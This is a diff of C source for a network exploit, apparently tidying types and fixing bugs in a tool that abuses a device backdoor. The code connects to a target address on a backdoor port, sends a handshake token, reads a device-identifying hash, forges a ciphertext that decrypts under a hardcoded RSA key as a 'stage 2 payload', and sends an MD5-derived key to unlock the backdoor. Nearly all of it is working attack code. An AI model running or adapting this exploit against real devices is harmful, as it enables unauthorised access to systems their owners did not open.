@@ -8,7 +8,7 @@
 #include <arpa/inet.h>
 #include <netinet/in.h>
 #include <openssl/bn.h>
-#include <openssl/err.h>
+//#include <openssl/err.h>
 #include <openssl/md5.h>
 #include <openssl/rsa.h>
 
@@ -68,13 +68,13 @@ int md5raw(unsigned char *out, const unsigned char *in, int len) {
   return 0;
 }
 
-char *device_identifying_hash() {
+unsigned char *device_identifying_hash() {
   unsigned char buffer[0x80];
   unsigned char *hash;
   hash = calloc(16, sizeof(char));
   memset(buffer, 0, 0x80);
-  strcpy(buffer, DEVICE_IDENTIFIER);
-  md5raw(hash, buffer, 0x80);
+  strcpy((char *) buffer, DEVICE_IDENTIFIER);
+  md5raw(hash, (const unsigned char *) buffer, 0x80);
   return hash;
 }
 
@@ -96,10 +96,11 @@ RSA *init_rsa() {
   BN_hex2bn(&n,  HARDCODED_n);
   rsa->e = e;
   rsa->n = n;
+  return rsa;
 }
 
 
-int decrypt_with_pubkey(RSA *rsa, char *ciphertext, char *plaintext) {
+int decrypt_with_pubkey(RSA *rsa, unsigned char *ciphertext, unsigned char *plaintext) {
   int sz;
   memset(plaintext, 0, PLAINTEXT_LENGTH);
   sz = RSA_size(rsa);
@@ -108,7 +109,7 @@ int decrypt_with_pubkey(RSA *rsa, char *ciphertext, char *plaintext) {
 }
 
 
-int encrypy_with_pubkey(RSA *rsa, char *plaintext, char *ciphertext) {
+int encrypy_with_pubkey(RSA *rsa, unsigned char *plaintext, unsigned char *ciphertext) {
   int sz;
   memset(ciphertext,0,CIPHERTEXT_LENGTH);
   sz = RSA_size(rsa);
@@ -175,7 +176,7 @@ int test() {
   };
 
   printf("[=] Test case: '%s'\n", test_case);
-  encrypy_with_pubkey(rsa, test_case, ciphertext);
+  encrypy_with_pubkey(rsa, (unsigned char *) test_case, ciphertext);
 
   res = memcmp(ciphertext, expected, CIPHERTEXT_LENGTH);
   if (res != 0) {
@@ -205,7 +206,7 @@ int communicate(char *ip_addr,
 
 
   int sockfd;
-  int n, len;
+  unsigned int n, len;
 
   struct sockaddr_in server_addr;
 
@@ -281,9 +282,9 @@ int check_tcp_port(char *ip_addr, int port) {
 
 
 
-char *find_phony_ciphertext(RSA *rsa) {
-  char *phony_ciphertext;
-  char phony_plaintext[0x80];
+unsigned char *find_phony_ciphertext(RSA *rsa) {
+  unsigned char *phony_ciphertext;
+  unsigned char phony_plaintext[0x80];
   int i;
   phony_ciphertext = calloc(PLAINTEXT_LENGTH, sizeof(char));
   do {
@@ -292,7 +293,7 @@ char *find_phony_ciphertext(RSA *rsa) {
     }
     decrypt_with_pubkey(rsa, phony_ciphertext, phony_plaintext); 
     for (i = 0x21; i < 0x7f; i++) {
-      if (phony_plaintext[0] ^ (unsigned char) i == 0x00) {
+      if ((phony_plaintext[0] ^ (unsigned char) i) == 0x00) {
         fprintf(stderr, "[!] Found stage 2 payload:\n");
         fhexdump(stderr, phony_ciphertext, PLAINTEXT_LENGTH);
         fprintf(stderr, "[=] Decrypts to:\n");
@@ -308,9 +309,7 @@ char *find_phony_ciphertext(RSA *rsa) {
 
 int main(int argc, char **argv) {
   unsigned char ciphertext[CIPHERTEXT_LENGTH];
-  char plaintext[PLAINTEXT_LENGTH+1];
-  int res;
-  int len;
+  unsigned char plaintext[PLAINTEXT_LENGTH+1];
   RSA *rsa;
   WIPE();
 
@@ -332,7 +331,8 @@ int main(int argc, char **argv) {
     fflush(stdin);
     fprintf(stderr, "[+] Read data:\n");
     fhexdump(stderr, plaintext, PLAINTEXT_LENGTH);
-    fprintf(stderr, "[+] Encrypting plaintext '%s' of length %ld\n", plaintext, strlen(plaintext));
+    fprintf(stderr, "[+] Encrypting plaintext '%s' of length %ld\n", plaintext, 
+        strlen((char *) plaintext));
     encrypy_with_pubkey(rsa, plaintext, ciphertext);
     hexdump(ciphertext, CIPHERTEXT_LENGTH);
     exit(0);
@@ -344,7 +344,7 @@ int main(int argc, char **argv) {
     fprintf(stderr, "[+] Decrypting with public key...\n");
     decrypt_with_pubkey(rsa, ciphertext, plaintext);
     hexdump(plaintext, PLAINTEXT_LENGTH);
-    fprintf(stderr, "[+] strlen(decrypt_with_pubkey(payload)) = %ld\n", strlen(plaintext)); 
+    fprintf(stderr, "[+] strlen(decrypt_with_pubkey(payload)) = %ld\n", strlen((char *) plaintext)); 
     //print_temp_key(plaintext);
     exit(0);
   }
@@ -353,11 +353,11 @@ int main(int argc, char **argv) {
   /** The exploit **/
 
   char *ip_addr = argv[1]; 
-  char *handshake_token = "ABCDEF1234";
-  char *phony_ciphertext;
-  char backdoor_key[16];
-  char *magic_salt = "+TEMP";
-  char *id;
+  const char *handshake_token = "ABCDEF1234";
+  unsigned char *phony_ciphertext;
+  unsigned char backdoor_key[16];
+  const char *magic_salt = "+TEMP";
+  unsigned char *id;
   unsigned char buffer[CIPHERTEXT_LENGTH];
   int tries = 1000;
   int tries_left = tries;
@@ -390,8 +390,8 @@ int main(int argc, char **argv) {
     printf("[+] Sending handshake token: %s\n", handshake_token);
     printf("[-] Waiting for device identifying hash...\n");
     communicate(ip_addr, BACKDOOR_PORT,
-        handshake_token,
-        strlen(handshake_token),
+        (unsigned char *) handshake_token,
+        strlen((char *) handshake_token),
         buffer,
         16);
     printf("[+] Received device identifying hash:\n");
@@ -426,8 +426,8 @@ int main(int argc, char **argv) {
     bar('=');
     memset(backdoor_key, 0, 0x10);
     printf("[+] Sending MD5('%s') and hoping for collision...\n",
-        magic_salt);
-    md5raw(backdoor_key, magic_salt, strlen(magic_salt));
+        (char *) magic_salt);
+    md5raw(backdoor_key, (unsigned char *) magic_salt, strlen(magic_salt));
     communicate(ip_addr, BACKDOOR_PORT,
         backdoor_key,
         0x10,
